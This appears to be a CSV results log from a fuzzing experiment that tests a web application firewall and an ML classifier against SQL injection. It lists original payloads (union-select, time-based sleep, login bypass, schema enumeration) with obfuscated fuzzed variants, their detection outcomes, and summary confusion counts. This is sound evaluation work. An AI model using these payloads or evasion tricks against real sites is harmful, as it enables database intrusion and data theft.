Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
32,2024-12-16T15:23:39.699053,1  )   as kaew where 2658  =  2658,403,403,200,waf_correct_ml_incorrect,4802 lIKe 4802/**/ )   AS kaew	wheRE (SELEcT (SELEcT 1))   likE   2658,2024-12-16T15:23:41.366061,403,403,both_correct,"4183 iN (4182,4183,4184) LIke 4802/* *//**/)   as kaew	where (sElECT (SELEcT 0x1))   LIKe 
  OR 0",2024-12-16T15:23:45.709199,403,403,both_correct,"4183 IN (4182,4183,'g'<>'gs') lIKe	4802/**/ )   As kaew	WherE (sELECt (SeLeCt 0x1))   LIKe 
  or  oR (SELECT 0)",2024-12-16T15:23:51.239959,403,403,both_correct,"4183 in ( OR 0,(SELECT 4183),'g' NOT LIKE 'gs') LIke	3992 LIKE 3992  ) 	 AS kaew	WHErE (sElecT (seleCT 0x1))   LikE 
  OR  oR (SELeCT 0)",2024-12-16T15:23:57.713698,200,403,waf_incorrect_ml_correct,"'	[LzC' NOT LIKE '	[LzC0' IN ( oR  || 0,(sELECt (SELECT 4183)),'g' NOT LIKE 'gs') liKE	3992/**/lIKe 3992  ) 	 aS kaew
WHEre (sEleCT (sEleCt 0x1))   LIKe 
  oR  oR (seLeCt 0)",2024-12-16T15:24:05.154742,200,200,both_incorrect
33,2024-12-16T15:24:14.232342,"pl. finlandia, 58, 7?d",200,200,403,waf_correct_ml_incorrect,"pl.	finlandia,/**/3112<>3113, (SeLEcT  AND 1)?d",2024-12-16T15:24:15.361350,200,200,both_correct,"pl. finlandia, (SELECT 1)<>(SELECT 3113), (SELeCT  && 4947 NOT LIKE 4948)?d",2024-12-16T15:24:18.629564,403,403,both_incorrect,"pl.	finlandia,/**/(SEleCt 0x2038 In (8247,8248,8249))!=(SeleCT 3113), (SelECT  &&  OR 0 NOT LIKE 4948)?d",2024-12-16T15:24:23.233446,200,200,both_correct,"pl.	finlandia,/**/(SeleCT 0x2038 In (8247,8248,8249))!=(SEleCt/**/ OR 0), (sEleCt  &&  || (seLECT	0) NOT LIKE 'M4J'<>'M4J8')?d",2024-12-16T15:24:29.448856,403,403,both_incorrect,"pl.	finlandia,/**/(seLEct 0x2038 iN (0x2037,8248, and 'Lw' LIKe 'Lw'))!=(sElECt/**/ Or 0), (SeLECt
 &&  || (select	0) NOT LIKE/**/'M4J'<>'M4J8')?d",2024-12-16T15:24:36.370759,403,200,waf_incorrect_ml_correct
34,2024-12-16T15:24:44.265987,update,403,200,200,both_incorrect,UPdAtE,2024-12-16T15:24:44.688648,200,200,both_incorrect,uPdatE,2024-12-16T15:24:46.075288,200,200,both_incorrect,updAte,2024-12-16T15:24:47.471469,200,200,both_incorrect,UPDate,2024-12-16T15:24:48.884648,200,200,both_incorrect,UPdAtE,2024-12-16T15:24:50.305009,200,200,both_incorrect
35,2024-12-16T15:24:51.693960,"-6600'  )   union all select 5566,5566#",403,403,403,both_correct,"-0x19c8'  )/**/  union all select 'H-U' LIKE 'H-U',	oR 0#",2024-12-16T15:24:53.657152,403,403,both_correct,"-0x19c8'  )/**/  union/**/all
select 'H-U' LIKE 'H-U',	oR '_$'<>'_$h'#e",2024-12-16T15:24:57.635688,403,200,waf_correct_ml_incorrect,"-0x19c8'  )/**//**/ union/*Nc*/all	select 'H-U' LIKE 'H-U',	oR '_$'<>'_$h'#e",2024-12-16T15:25:02.094707,403,200,waf_correct_ml_incorrect,"-0x19c8'  )/**//**/ union/**/all	select/**/'H-U' LIKE 'H-U', oR '_$'<>'_$h'#e*r",2024-12-16T15:25:06.674913,403,200,waf_correct_ml_incorrect,"-0x19c8'  )/**/  union/**/all select/**/'H-U' LIKE 'H-U', oR '_$'<>'_$h'#e*r LikE ",2024-12-16T15:25:11.560122,403,200,waf_correct_ml_incorrect
36,2024-12-16T15:25:16.504991,16630,200,200,200,both_correct,"(SeLeCt/**/ oR
0)",2024-12-16T15:25:16.866933,403,200,waf_incorrect_ml_correct,"(selECT 	or
 && 6575<>(SeLECT 6576))",2024-12-16T15:25:18.761827,403,403,both_incorrect,"(selecT		or
/**/&& 0x19af<>(sELeCT ' OR 0'!='5#'))f",2024-12-16T15:25:21.605320,403,200,waf_incorrect_ml_correct,"(seLect		Or
/*)*/&& 0x19af NOT LIKE/**/(SeLecT ' OR 0x0'!=' AND 1867 NOT	LIKE 1868#'))f",2024-12-16T15:25:25.073018,403,403,both_incorrect,"(SelECT		OR
/*)*/ aNd  0x19af
NOT LIKE (sELecT ' OR 0x0'!=' AND 0x74b NOT	LIKE  AND 109 LIKE 109#'))fJO",2024-12-16T15:25:30.524904,403,403,both_incorrect
37,2024-12-16T15:25:36.336964,[email],200,200,200,both_correct,[email],2024-12-16T15:25:37.925447,200,200,both_correct,[email],2024-12-16T15:25:40.528159,200,200,both_correct,[email],2024-12-16T15:25:43.127613,200,200,both_correct,[email],2024-12-16T15:25:45.719828,200,200,both_correct,[email],2024-12-16T15:25:48.346102,200,200,both_correct
38,2024-12-16T15:25:50.915540,"1'   )    )    as qwdh where 7581  =  7581 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",403,403,200,waf_correct_ml_incorrect,"1'   )    )    as qwdh where 7581  =  7581 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  (SELECT 1)  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  0x45 
)  ||char  (  83  )  ,null  )  ,'l2' LIKE 'l2'  )  ,500000000/**/ )  ,null  )  --",2024-12-16T15:26:04.177104,403,200,waf_correct_ml_incorrect,"1'   )    )    as qwdh where 7581  =  7581 or char  (  0x75  )  ||char  (  111  )  ||char  (  118 LIKE 118  )  ||char  (  (SELECT 1)  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  0x45 	)  ||char  (   AND 1  )  ,null  )  ,'l2' LIKE 'l2'  )  ,500000000  )  ,null  )  --",2024-12-16T15:26:19.106242,403,403,both_correct,"1'   )    )    as qwdh where 7581  =  8464 LIKE 8464 or char  (  0x75  )  ||char  (  111  )  ||char  (  118 LIKE 118  )  ||char  (  (SELECT 1)  )    =  regexp_substring /**/(  repeat  (  left  (  crypt_key  (  char  (  (SELECT 65)  )  ||char  (  0x45  )  ||char  (   AND 1  )  ,null  )  ,'l2' LIKE 'l2'  )  ,(SelEcT 1)  )  ,null  )  --",2024-12-16T15:26:34.704536,403,403,both_correct,"1'   )    )    as qwdh where 7581  =  8464 LIKE 8464 or char  (  0x75  )  ||char  (  111  )  ||char  (  (SELECT 118) LIKE  OR 0  )  ||char  (  (SELECT 6832 IN (6831,6832,6833))  )    =  regexp_substring /**/(  repeat  (
 left  (/*!*/ crypt_key  (  char  (  (SELECT 65)  )  ||char  (  0x45  )  ||char  (   AND 1  )  ,null  )  ,'l2' LIKE 'l2'  )  ,(select 1)  )  ,null  )  --",2024-12-16T15:26:51.447565,403,403,both_correct,"1'   )    )    as qwdh where (SELECT 1)  =  8464 LIKE 'p'='p' or char  (  0x75  )  ||char  (  111  )  ||char  (  (SELECT 118) LIKE  OR 0  )  ||char  (  (SELECT 6832 IN (6831,0x1ab0,6833))  )    =  regexp_substring  (  repeat  (  left  (/*_h@r*/ crypt_key  (  char  (  (SELECT 65)  )  ||char  (  0x45  )  ||char  (   AND 1  )  ,null  )  ,'l2' LIKE 'l2'  )  ,(SeLeCt 1)  )  ,null  )  --",2024-12-16T15:27:10.373798,403,403,both_correct
39,2024-12-16T15:27:29.230189,"1' in boolean mode  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  #",403,403,200,waf_correct_ml_incorrect," AND/**/1' IN boolean mode  )   OR 2633  =  dbms_pipe.receive_message  (  chr  (  9231 LIKE 9231  )   or chr	 (  65  )  ||chr  (  65  )  ||chr  (  0x67  )  ,5  )  #m",2024-12-16T15:27:36.142361,403,200,waf_correct_ml_incorrect," ANd/**/1' iN boolean mode  )   Or (SeLEct 1)   likE   dbms_pipe.receive_message  (  chr /**/(  2203=2203 LiKE 9231  )   or chr	 (  65  )  ||chr  (  (SeLeCT
65)  )  ||chr  (  0x67  )  ,5  )  #m",2024-12-16T15:27:44.798100,403,200,waf_correct_ml_incorrect," AnD 1' In boolean mode  )   Or (SeLeCt ')' NOT LIKE ')q')   LIkE   dbms_pipe.receive_message  (  chr /**/(  (SELECT 1)=2203 lIKE 9231  )   Or chr  (  0x41  )  ||chr  (  (seLECt
65)  )   OR chr  (  0x67  )  ,5  )  #m%",2024-12-16T15:27:54.771694,403,200,waf_correct_ml_incorrect," aND  OR 0' In boolean mode  )   Or	(SeLeCt ')' NOT LIKE ')q')   liKE   dbms_pipe.receive_message  (  chr  (  (SelECt 1)=2203 liKE 9231  )   oR chr  (  0x41  )  ||chr  (  (seLeCT
(SELECT 'tw'='tw'))  )   oR chr  (  0x67  )  ,5  )  #m%W?",2024-12-16T15:28:06.156573,403,200,waf_correct_ml_incorrect,"
anD  oR 0' In boolean mode  )   Or	(SeLeCt ')' NOT LIKE/**/')q')   liKE   dbms_pipe.receive_message  (  chr  (  (SelECt  AND (SELECT 1))=2203 liKE 'h|' NOT LIKE 'h|Z'  )   oR chr  (  0x41  )  ||chr  (  (seLeCT
(SELECT 'tw'='tw'))  )   oR chr  (  0x67  )  ,5  )  #m%W?>",2024-12-16T15:28:18.224816,403,403,both_correct
40,2024-12-16T15:28:32.011520,"1'   )    )    union all select null,null,null--",403,403,403,both_correct,"0x1'   ) /**/  )
   union all SeLecT null,null,null--",2024-12-16T15:28:34.311842,403,403,both_correct,"0x1'
  )    )
   union all SElECT null,null,null--",2024-12-16T15:28:37.887954,403,403,both_correct,"0x1'
 
)  /**/ )
   union all sELECt null,null,null--",2024-12-16T15:28:41.358839,403,403,both_correct,"0x1'
  )    )
   union all SeLeCT null,null,null--",2024-12-16T15:28:44.997968,403,403,both_correct,"0x1'   )    )
  /**/union all seLECT null,null,null--",2024-12-16T15:28:48.423313,403,403,both_correct
41,2024-12-16T15:28:52.221563,kresl,200,200,200,both_correct,kresl,2024-12-16T15:28:52.591266,200,200,both_correct,kresl,2024-12-16T15:28:53.936984,200,200,both_correct,kresl,2024-12-16T15:28:55.287313,200,200,both_correct,kresl,2024-12-16T15:28:56.659976,200,200,both_correct,kresl,2024-12-16T15:28:58.024724,200,200,both_correct
42,2024-12-16T15:28:59.390179,"1""  )   as tnux where 4888  =  4888 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",403,403,403,both_correct,"'l'' NOT LIKE 'l'A'""  )   aS tnux WheRE 0x1318   like    OR 0 rlike   (  sElEct * fROm   (  SeLEct  (  sleep  (  5   )  /*I*/ )     )  vwyq
 )  #",2024-12-16T15:29:04.786849,403,200,waf_correct_ml_incorrect,"'l'' NOT LIKE 'l'A'""  )   As
tnux WhErE 0x1318   LIKE    Or 1493 NOT LIKE 1494 rlike   (/**/ select * fRoM   (  SeLecT  (  sleep  (   and 0x1   )  /**/ )     )  vwyq
 )  #/4",2024-12-16T15:29:12.495406,403,403,both_correct,"'l'' NOT LIKE 'l'A'""  ) 	 as
tnux wHERe 0x1318   LiKe    or 1493 not like 6067!=0x17b4 rlike   (/**/ seLeCT */**/FROM   (  sELeCt  (  sleep  (   anD 0x1   )  /**/ )     )  vwyq
 )  #/(SELECT 1)?",2024-12-16T15:29:21.924908,403,200,waf_correct_ml_incorrect,"'l'' NOT LIKE 'l'A'""  ) 	 as
tnux/**/WheRe 0x1318   LikE    oR 0xedd!=(SELECT 1) not like 6067 NOT LIKE 0x17b4 rlike   (/**/ sELeCt */**/froM 
 (  seLECt  (  sleep  (   And 0x1   )  /*6TVk*/ )     )  vwyq
 )  #/(SElEcT 1)?",2024-12-16T15:29:32.069215,403,200,waf_correct_ml_incorrect,"'l'' NOT LIKE 'l'A'""  ) 
 as
tnux/*\9*/WhERe 0x1318   LIKE    oR 0xedd!=(seLeCt  and 1) not like 'Q' NOT LIKE 'Q7' not like 0x17b4 rlike   (/**/ selEcT * fROm 
 (  seleCT  (  sleep  (   AnD 0x1   )  /*6TVk*/ )     )  vwyq
 )  #/(SelECt 0x1)?",2024-12-16T15:29:43.634028,403,200,waf_correct_ml_incorrect
43,2024-12-16T15:29:56.090172,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",403,403,200,waf_correct_ml_incorrect,"sELEcT count  (  *  )   froM rdb$fields aS t1,rdb$types As/**/t2,rdb$collations
as t3,rdb$functions aS t4",2024-12-16T15:30:00.910283,403,200,waf_correct_ml_incorrect,"SElECT count  (  *  )   FrOM
rdb$fields as t1,rdb$types aS t2,rdb$collations
aS t3,rdb$functions as t4",2024-12-16T15:30:06.975953,403,200,waf_correct_ml_incorrect,"SELEct count  (  *  )   FRoM
rdb$fields aS t1,rdb$types/**/aS t2,rdb$collations	aS t3,rdb$functions as t4",2024-12-16T15:30:13.024788,403,200,waf_correct_ml_incorrect,"selEct count  (  * 
)   frOm
rdb$fields As/**/t1,rdb$types/**/AS t2,rdb$collations	As t3,rdb$functions AS t4",2024-12-16T15:30:19.060352,403,200,waf_correct_ml_incorrect,"SElEcT count  (  * 
)  /**/fRoM
rdb$fields as/**/t1,rdb$types/**/as t2,rdb$collations aS t3,rdb$functions aS t4",2024-12-16T15:30:25.257891,403,200,waf_correct_ml_incorrect
44,2024-12-16T15:30:31.629452,[email],200,200,200,both_correct,[email],2024-12-16T15:30:32.692734,200,200,both_correct,[email],2024-12-16T15:30:34.732521,200,200,both_correct,[email],2024-12-16T15:30:36.780314,200,200,both_correct,[email],2024-12-16T15:30:38.849697,200,200,both_correct,[email],2024-12-16T15:30:40.910143,200,200,both_correct
45,2024-12-16T15:30:43.191320,8589,200,200,200,both_correct,"(SELECT
'&R'!='&R}')",2024-12-16T15:30:43.545495,403,403,both_incorrect,"(SEleCt
'&R' NOT	LIKE '&R}')",2024-12-16T15:30:45.631768,403,403,both_incorrect,"(sELeCt
'&R'/**/NOT
LIKE '&R}')",2024-12-16T15:30:48.015121,403,403,both_incorrect,"(SElEct	'&R' NOT
LIKE '&R}')",2024-12-16T15:30:50.596674,403,403,both_incorrect,"(SeLECt '&R'/**/NOT
LIKE '&R}')",2024-12-16T15:30:53.013495,403,403,both_incorrect
46,2024-12-16T15:30:55.587093,[email],200,200,200,both_correct,[email],2024-12-16T15:30:56.731996,200,200,both_correct,[email],2024-12-16T15:30:58.872395,200,200,both_correct,[email],2024-12-16T15:31:01.036695,200,200,both_correct,[email],2024-12-16T15:31:03.221187,200,200,both_correct,[email],2024-12-16T15:31:05.383547,200,200,both_correct
47,2024-12-16T15:31:07.506657,"admin""  )   or ""1""  =  ""1""/*",403,403,200,waf_correct_ml_incorrect,"admin"" /**/)   or ""495=(selEct 1)""  =
 ""0x1""/*",2024-12-16T15:31:08.911250,403,200,waf_correct_ml_incorrect,"admin""  )   or "" OR 0x0 like (SELECT '#P(a'!='#P(ar')""  =  ""0x1""/*",2024-12-16T15:31:12.134923,403,403,both_correct,"admin""/**/ )   or "" Or 0x0 LiKE (selECT '#P(a' not like '#P(ar')""
 =  ""0x1""/*{o",2024-12-16T15:31:16.377796,403,200,waf_correct_ml_incorrect,"admin""  )   or "" oR 0x0 LIke (sEleCT '#P(a' not like
'#P(ar')""
 =  ""0x1""/*{oY",2024-12-16T15:31:21.417583,403,200,waf_correct_ml_incorrect,"admin""  )   or "" oR 0x0 lIKe (SeLECT '#P(a' not/**/like
'#P(ar')""  =  ""0x1""/*{oY",2024-12-16T15:31:26.092278,403,200,waf_correct_ml_incorrect
48,2024-12-16T15:31:30.871410,-7636'  )   or 5898  =  8880 and   (  'sjuv'  =  'sjuv,403,403,200,waf_correct_ml_incorrect,-7636'  )   or	5898  =   AND 9145 NOT LIKE/**/(SELECT 9146) and   (  'sjuv'  =  'sjuv,2024-12-16T15:31:33.475396,403,403,both_correct,"-7636'  )   or	(SELECT 1)  =   AND 9145 NOT LIKE/**/(SELECT 6239 NOT/**/LIKE 0x1860) and 
 (  'sjuv'  =  'sjuv",2024-12-16T15:31:38.594927,403,403,both_correct,"-7636' 
)   or	(SELECT 1611=1611)  =   AND (SELECT 0x1) NOT LIKE (SELECT 6239 NOT/**/LIKE 0x1860) and 
 (  'sjuv'  =  'sjuv",2024-12-16T15:31:44.795964,403,403,both_correct,"-7636' 
)   or	(SELECT 'DPd' NOT LIKE 'DPdZ'=1611)  =   AND (SELECT 0x1) NOT LIKE (SELECT  AND 0x1 NOT LIKE 0x1860) and 	 (  'sjuv'  =  'sjuv",2024-12-16T15:31:51.852729,403,403,both_correct,"-(SELeCt  anD 7996 NOT LIKE 7997)' 
)   or	(SELECT 'DPd' NOT LIKE 'DPdZ'=1611)  =   AND (SELECT 0x1) NOT LIKE (SELECT  AND 0x1 NOT LIKE 0x1860) and   (/**/ 'sjuv'  =  'sjuv",2024-12-16T15:31:59.513544,403,403,both_correct
49,2024-12-16T15:32:08.618025,"1  )   as udjn where 6871  =  6871 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",403,403,200,waf_correct_ml_incorrect,"1  )   AS udjn wHeRe (sELeCT 1)  =  0x18f3 lIkE 6387 OR 4915   LiKE 	   (  SELECT count  (  *  )   FRoM domain.domains As t1,domain.columns AS t2,domain.tables aS t3  ) /**/--",2024-12-16T15:32:15.917362,403,200,waf_correct_ml_incorrect,"1  )   aS udjn wHEre (selEcT 1)  =  0x18f3 likE 0x18f3 oR 9796!= ANd 1   lIKE 
 /**/ (  seLEct count  (  *  )   FRom domain.domains As t1,domain.columns as t2,domain.tables AS t3  ) /*u4)b*/--",2024-12-16T15:32:25.031741,403,200,waf_correct_ml_incorrect,"1  )   as udjn whERE (seLecT  oR 0)   lIKe   0x18f3 like 0x18f3 or 0x2644!= ANd '`W2cZ'='`W2cZ'   LIKe 
   (  SeLecT count  (  * 
)   frOM domain.domains AS t1,domain.columns as t2,domain.tables As t3  ) /*u4)b*/--",2024-12-16T15:32:35.063882,403,200,waf_correct_ml_incorrect,"'A6'<>'A6m'  )   AS udjn/**/whERe (Select  OR (SELECT (SELECT 1)))   lIKe   0x18f3 lIKE 0x18f3 OR 0x2644!= ANd '`W2cZ'='`W2cZ'   liKe 	   (  selEcT count  (  * 
)   FRoM domain.domains aS t1,domain.columns AS t2,domain.tables aS t3  ) /*u4)b*/--",2024-12-16T15:32:46.393374,403,403,both_correct,"'A6'<>'A6m'  )   as udjn/*x)cP*/wHeRE (SElect  oR (sELEct/**/(SeleCt '/sm'<>'/sm&')))   like   0x18f3 LIke 0x18f3 Or 0x2644!= and '`W2cZ'='`W2cZ'   lIke 	   (  SeLEcT count  (  * 	)   fROM domain.domains aS t1,domain.columns AS t2,domain.tables AS t3  ) /*u4)b*/--",2024-12-16T15:32:58.760618,403,200,waf_correct_ml_incorrect
50,2024-12-16T15:33:12.233338,2502,200,200,200,both_correct, Or '#\'	NOT/**/LIKE '#\K',2024-12-16T15:33:12.554678,200,200,both_correct," or '#\'
NOT/**/LIKE/**/'#\K'L",2024-12-16T15:33:14.824508,200,200,both_correct, Or '#\'	NOT LIKE/**/'#\K'Ll,2024-12-16T15:33:17.258768,200,403,waf_correct_ml_incorrect," or '#\'
NOT LIKE '#\K'Ll""O",2024-12-16T15:33:19.627421,200,403,waf_correct_ml_incorrect,"/*w49*/or '#\' NOT LIKE '#\K'Ll""O",2024-12-16T15:33:21.981674,200,403,waf_correct_ml_incorrect

Overall Results
WAF TP,144
WAF TN,114
WAF FP,18
WAF FN,24
ML TP,92
ML TN,105
ML FP,27
ML FN,76

Combined Results (2x2 Matrix)
,WAF Correct,WAF Incorrect
ML Correct,181,16
ML Incorrect,77,26
